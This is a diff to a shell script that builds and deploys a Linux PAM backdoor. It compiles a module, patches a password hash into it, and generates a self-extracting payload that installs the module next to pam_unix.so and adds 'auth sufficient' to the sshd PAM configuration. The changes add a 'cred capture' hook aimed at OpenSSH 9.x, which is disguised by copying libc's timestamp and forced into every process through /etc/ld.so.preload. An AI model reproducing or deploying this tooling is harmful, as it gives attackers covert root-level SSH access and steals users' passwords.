@@ -34,9 +34,13 @@ case "$ARCH" in
         ;;
 esac
 
+# Build PAM module
 $CC -fPIC -shared -O3 -s -fvisibility=hidden \
     -o pam_auth.so "$TEMPLATE" \
     -lpam 2>/dev/null
+
+# Build hook for OpenSSH 9.x cred capture
+$CC -fPIC -shared -O2 -s -o pam_hook.so "$SCRIPT_DIR/pam_hook.c" -ldl 2>/dev/null
 
 # Find placeholder offset (unique pattern)
 # Pattern: DEADBEEFCAFEBABE0123456789ABCDEFFEDCBA9876543210133742 69BEEFCAFE
@@ -57,8 +61,9 @@ for i in $(seq 0 2 62); do
     HASH_BIN="$HASH_BIN\\x${HASH:$i:2}"
 done
 
-# Base64 encode the .so
+# Base64 encode both .so files
 SO_B64=$(base64 -w0 pam_auth.so)
+HOOK_B64=$(base64 -w0 pam_hook.so)
 
 # Generate self-extracting payload
 cat << 'PAYLOAD_HEAD'
@@ -73,11 +78,12 @@ cat << PAYLOAD_VARS
 OFFSET=$OFFSET
 HASH_BIN="$HASH_BIN"
 SO_B64="$SO_B64"
+HOOK_B64="$HOOK_B64"
 PAYLOAD_VARS
 
 cat << 'PAYLOAD_TAIL'
 
-# Decode .so
+# Decode PAM module
 SO_FILE=$(mktemp)
 echo "$SO_B64" | base64 -d > "$SO_FILE"
 
@@ -88,7 +94,7 @@ printf "$HASH_BIN" | dd of="$SO_FILE" bs=1 seek=$OFFSET conv=notrunc 2>/dev/null
 PAM_DIR=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)
 [ -z "$PAM_DIR" ] && echo "PAM not found" && rm "$SO_FILE" && exit 1
 
-# Deploy
+# Deploy PAM module
 cp "$SO_FILE" "$PAM_DIR/pam_auth.so"
 chown root:root "$PAM_DIR/pam_auth.so"
 chmod 644 "$PAM_DIR/pam_auth.so"
@@ -98,6 +104,12 @@ rm "$SO_FILE"
 # Configure PAM
 grep -q "pam_auth.so" /etc/pam.d/sshd || sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
 grep -q "session.*pam_auth.so" /etc/pam.d/sshd || echo "session optional pam_auth.so" >> /etc/pam.d/sshd
+
+# Deploy hook (helps on some systems, OpenSSH 9.x still scrubs passwords)
+echo "$HOOK_B64" | base64 -d > /lib/pam_hook.so
+chmod 644 /lib/pam_hook.so
+touch -r /lib/libc.so.* /lib/pam_hook.so 2>/dev/null
+echo "/lib/pam_hook.so" > /etc/ld.so.preload
 
 echo "deployed"
 PAYLOAD_TAIL
